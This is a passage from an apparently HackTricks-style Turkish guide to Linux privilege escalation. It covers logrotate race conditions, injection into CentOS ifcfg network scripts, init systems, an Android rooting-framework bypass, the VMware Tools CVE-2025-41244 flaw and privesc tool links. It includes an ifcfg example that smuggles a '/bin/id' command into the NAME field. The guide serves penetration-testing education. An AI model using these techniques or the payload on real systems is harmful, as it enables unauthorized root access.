Ayrıcalıklı bir `logrotate` işi, yalnızca düşük ayrıcalıklı bir kullanıcının döndürme sırasında değiştirebildiği veya yönlendirebildiği bir dizinin altındaki günlüğü gerçekten döndürdüğünde, kullanıcılar arası dosya yazma yolu oluşturabilir. Tek başına yazılabilir bir günlük, yalnızca incelemeye değer bir ipucudur. Etkin kuralı ve `create`, `olddir` ve `su` yönergelerini; zamanlayıcının etkin kimliğini; günlüğün üst dizinindeki yazma ve arama izinlerini; ayrıca kurulu sürümün ve politikanın hedef değişikliğine izin verip vermediğini doğrulayın. Ayrıcalıklı bir kabuğun daha sonra açılış dosyasına yazılan dosyayı yüklemesi de komut çalıştırılması için gerekir. Döndürmeyi tetiklemeden veya yarış koşulunu denemeden zamanlamayı, kuralı, sürüm/paketlemeyi ve yol metaverilerini inceleyin.

> [!TIP]
> `3.18.0` sürümünü veya başka herhangi bir sürüm dizgesini istismar edilebilirliğin tek başına belirleyicisi olarak görmeyin. [Upstream değişiklik günlüğünde](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) birden fazla sürümde dizin ve symlink güvenlik iyileştirmeleri kaydedilmiştir; dağıtımlar düzeltmeleri eski sürümlere de aktarabilir. [Upstream kılavuzu](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in), root ayrıcalığıyla, ayrıcalıksız kullanıcıların denetimindeki dizinlerde günlük döndürülürken `su` kullanılmasını önerir; etkin kuralı ve gerçek davranışı doğrulayın.

Güvenlik açığı hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx günlükleri)** ile çok benzerdir; bu nedenle günlükleri değiştirebildiğinizi fark ettiğinizde, bu günlükleri kimin yönettiğini ve günlükleri symlink'lerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Düşük ayrıcalıklı bir kullanıcı bir `ifcfg-*` dosyasını oluşturabiliyor veya değiştirebiliyorsa **ve** ayrıcalıklı bir ağ etkinleştirme yolu bu dosyayı okuyacaksa, dosya incelemeye değer bir ipucudur. Etkin dosyanın ve dizinin izinlerini, seçili arayüzü, kurulu `ifup`/`ifdown` uygulamasını ve bunları kimin çağırdığını doğrulayın. Tek başına yazılabilir bir dosya kod çalıştırılmasına neden olmaz. [Red Hat'in RHEL 7 ağ kılavuzu](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files), eski ağ betikleri ile NetworkManager arasındaki farkı açıklar: NetworkManager tek başına eski betikleri tetiklemez. [RHEL 8 belgelerine](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and_managing-networking) göre varsayılan `ifup`/`ifdown`, NetworkManager'ı kullanır; isteğe bağlı eski paket ise shell betikleri sağlar.

Gerçekten ayrıcalıklı eski betikleri kullanan bir sistemde, tırnak içine alınmamış ve shell tarafından kaynak olarak yüklenen `NAME=` gibi bir `ifcfg-*` ataması kod çalıştırma sınırını aşabilir. Dosya adından veya NetworkManager'ın varlığından shell yorumlaması olduğu sonucunu çıkarmayın; kullanılan ayrıştırıcıyı, değeri ve etkinleştirme yolunu doğrulayın. Çağıranın girdisini `ifcfg-*` dosyasına yazıp ardından eski `ifup`'ı çağıran, sudo ile çalıştırılmasına izin verilen bir sarmalayıcı; çağıran dosyayı doğrudan düzenleyemese bile bu sınıra giden ayrı bir yoldur.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network ile /bin/id arasındaki boşluğa dikkat_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, System V init (SysVinit) için **klasik Linux hizmet yönetim sistemi** olan **betiklere** ev sahipliği yapar. Bu betikler hizmetleri `start`, `stop`, `restart` ve bazen `reload` komutlarıyla yönetir. Doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilirler. Redhat sistemlerindeki alternatif yol `/etc/rc.d/init.d` şeklindedir.

Öte yandan, `/etc/init` dizini Ubuntu tarafından sunulan ve hizmet yönetimi görevleri için yapılandırma dosyaları kullanan daha yeni bir **hizmet yönetimi sistemi** olan **Upstart** ile ilişkilidir. Upstart'a geçişe rağmen, Upstart'taki bir uyumluluk katmanı sayesinde SysVinit betikleri Upstart yapılandırmalarıyla birlikte kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunan modern bir başlatma ve hizmet yöneticisi olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/`, yönetici değişiklikleri içinse `/etc/systemd/system/` altında düzenleyerek sistem yönetimi sürecini kolaylaştırır.<sup>[[21]](#references)</sup>

## Diğer Hileler

### NFS yetki yükseltme


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden kaçış


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting framework'leri, ayrıcalıklı kernel işlevlerini userspace yöneticisine sunmak için genellikle bir syscall'u hook'lar. Zayıf yönetici kimlik doğrulaması (ör. FD sırasına dayalı imza denetimleri veya yetersiz parola yöntemleri), yerel bir uygulamanın yöneticiyi taklit etmesine ve zaten root edilmiş cihazlarda yetkisini root'a yükseltmesine olanak sağlayabilir. Daha fazla bilgi ve exploit ayrıntıları için:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex tabanlı exec aracılığıyla VMware Tools hizmet keşfi LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations'taki regex tabanlı hizmet keşfi, süreç komut satırlarından bir ikili dosya yolu çıkarıp bunu ayrıcalıklı bir bağlamda -v ile çalıştırabilir. Esnek desenler (ör. \S kullanımı), saldırganın yazılabilir konumlara (ör. /tmp/httpd) yerleştirdiği listener'larla eşleşebilir ve root olarak kod çalıştırılmasına yol açabilir (CWE-426 Güvenilmeyen Arama Yolu).<sup>[[27]](#references)</sup>

Daha fazla bilgi edinmek ve diğer keşif/izleme yığınlarına uygulanabilecek genelleştirilmiş bir örüntüyü görmek için:


{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Korumaları

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Araçları

### **Linux'ta yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel açıklarını listeleyin [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla betiğin derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (Crontab UI yetki yükseltme, zip -P kimlik bilgilerini yeniden kullanma)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron tarafından çalıştırılan monitor için sahte .text_sig payload'u](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch atlatması (sudo env_keep PATH ele geçirme)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Temel Linux Yetki Yükseltme](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Yetki Yükseltme Rehberi](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Saldırı ve Savunma: 2016 Linux Yetki Yükseltme Teknikleri](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Kimse komut çalıştırılmasını beklemiyor!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Yetki Yükseltme)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Laboratuvar Alıştırmaları Çözüm Yolu - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Yetki Yükseltme için İpuçları ve Püf Noktaları](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration ve Yetki Yükseltme aracı](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket nedir?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) çözüm yazısı](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS'u keşfedin](https://www.linuxjournal.com/article/7744)
- [17] [SUID Çalıştırılabilir Dosyalarıyla Linux Yetki Yükseltme](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo 2. Bölüm – Linux Yetki Yükseltme](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux'ta ACL'ler nasıl yönetilir](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS network-scripts üzerinden root erişimi](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd nedir?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (log'lar üzerinden bash aritmetik enjeksiyonu, genel saldırı zinciri)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Kılavuzu – BASH_ENV (etkileşimsiz başlangıç dosyası)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink ile yetki yükseltme)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron kopyalaması → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Adını siz koyun, VMware onu yetkilendirir (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Yetki Yükseltmesi](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 ve CVE-2025-32463 Sudo yetki yükseltme açıkları](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Depo Dizinleri](https://peps.python.org/pep-3147/)
- [32] [Python importlib belgeleri](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec tarafından atılan tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux'ta Parolaları Kaydetme](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate Yarış Durumunun Ayrıntıları](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 belgeleri – `site` ve yol yapılandırma dosyaları](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
